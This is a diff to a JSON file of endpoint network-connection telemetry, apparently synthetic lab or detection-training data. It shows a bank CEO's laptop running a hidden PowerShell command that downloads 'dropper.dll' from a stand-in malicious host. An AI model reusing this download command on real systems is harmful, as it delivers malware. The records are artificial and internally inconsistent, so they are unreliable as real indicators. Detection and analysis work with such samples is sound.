@@ -1,52 +1,42 @@
 [
   {
-    "Timestamp": "2025-12-06T09:00:16.882Z",
-    "DeviceId": "WIN11-LAPTOP-CEODEV-5566",
-    "DeviceName": "ceo-laptop01.grandbank.corp",
-    "ActionType": "ConnectionSuccess",
-    "RemoteIP": "192.0.2.44",
-    "RemotePort": 443,
-    "RemoteUrl": "malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll",
-    "LocalIP": "10.10.22.55",
-    "LocalPort": 50432,
-    "Protocol": "TCP",
-    "LocalIPType": "Private",
-    "RemoteIPType": "Public",
-    "InitiatingProcessFileName": "powershell.exe",
-    "InitiatingProcessFileSize": 588032,
-    "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
-    "InitiatingProcessVersionInfoProductName": "Windows PowerShell",
-    "InitiatingProcessVersionInfoProductVersion": "5.1.22000.909",
-    "InitiatingProcessVersionInfoInternalFileName": "powershell",
-    "InitiatingProcessVersionInfoOriginalFileName": "PowerShell.exe",
-    "InitiatingProcessVersionInfoFileDescription": "Windows PowerShell",
-    "InitiatingProcessSHA1": "6f9e4b3d5a99a2e5e058ebd8d8e71f9e3a2ffbc1",
-    "InitiatingProcessSHA256": "b7a2c9d47f0e9c6a3b5d4e2f1c0b9a8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b",
-    "InitiatingProcessMD5": "9b8a7c6d5e4f3a2b1c0d9e8f7a6b5c4d",
-    "InitiatingProcessId": 6344,
-    "InitiatingProcessCommandLine": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri 'https://malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll' -OutFile 'C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\updcore.dll'\"",
-    "InitiatingProcessCreationTime": "2025-12-06T09:00:15.000Z",
-    "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
-    "InitiatingProcessParentFileName": "acrobat.exe",
-    "InitiatingProcessParentId": 5520,
-    "InitiatingProcessParentCreationTime": "2025-12-06T09:00:09.000Z",
-    "InitiatingProcessAccountDomain": "GRANDBANK",
-    "InitiatingProcessAccountName": "richard.sterling",
-    "InitiatingProcessAccountSid": "user-sid-12345",
-    "InitiatingProcessAccountUpn": "richard.sterling@grandbank.corp",
-    "InitiatingProcessAccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
-    "InitiatingProcessIntegrityLevel": "Medium",
-    "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
-    "ReportId": 99887766123,
-    "AppGuardContainerId": "",
-    "AdditionalFields": "[{\"NetworkMessageId\":\"source-record-id-5555\"},{\"AttachmentSHA256\":\"4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6\"}]",
-    "InitiatingProcessSessionId": 2,
-    "IsInitiatingProcessRemoteSession": false,
-    "InitiatingProcessRemoteSessionDeviceName": "",
-    "InitiatingProcessRemoteSessionIP": "",
-    "ProcessUniqueId": "6344-2025-12-06T09:00:15Z",
-    "InitiatingProcessUniqueId": "6344-2025-12-06T09:00:15Z"
-  },
+  "Timestamp": "2025-12-06T09:05:09Z",
+  "DeviceId": "WIN11-LAPTOP-CEODEV-5566",
+  "DeviceName": "ceo-laptop01.grandbank.corp",
+  "ActionType": "ConnectionSuccess",
+
+  "RemoteIP": "192.0.2.44",
+  "RemotePort": 443,
+  "RemoteUrl": "malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll",
+  "LocalIP": "10.10.22.55",
+  "LocalPort": 50432,
+  "Protocol": "TCP",
+
+  "InitiatingProcessFileName": "powershell.exe",
+  "InitiatingProcessSHA1": "6f9e4b3d5a99a2e5e058ebd8d8e71f9e3a2ffbc1",
+  "InitiatingProcessSHA256": "b7a2c9d47f0e9c6a3b5d4e2f1c0b9a8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b",
+  "InitiatingProcessMD5": "9b8a7c6d5e4f3a2b1c0d9e8f7a6b5c4d",
+  "InitiatingProcessFileSize": 588032,
+
+  "InitiatingProcessId": 7000, 
+  "InitiatingProcessCommandLine": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri 'https://malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll' -OutFile 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll'\"",
+  "InitiatingProcessCreationTime": "2025-12-06T09:05:08Z",
+
+  "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+
+  "InitiatingProcessParentFileName": "cmd.exe",
+  "InitiatingProcessParentId": 6540,
+  "InitiatingProcessParentCreationTime": "2025-12-06T09:05:09Z",
+
+  "InitiatingProcessAccountDomain": "GRANDBANK",
+  "InitiatingProcessAccountName": "richard.sterling",
+  "InitiatingProcessAccountSid": "user-sid-12345",
+  "InitiatingProcessAccountUpn": "richard.sterling@grandbank.corp",
+
+  "ReportId": 99887766123,
+  "AdditionalFields": "[{\"NetworkMessageId\":\"source-record-id-5555\"},{\"AttachmentSHA256\":\"4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6\"}]"
+}
+,
   {
     "Timestamp": "2025-12-06T09:00:27.204Z",
     "DeviceId": "WIN11-LAPTOP-CEODEV-5566",
@@ -144,3 +134,4 @@
     "InitiatingProcessUniqueId": "6684-2025-12-06T09:00:27Z"
   }
 ]
+
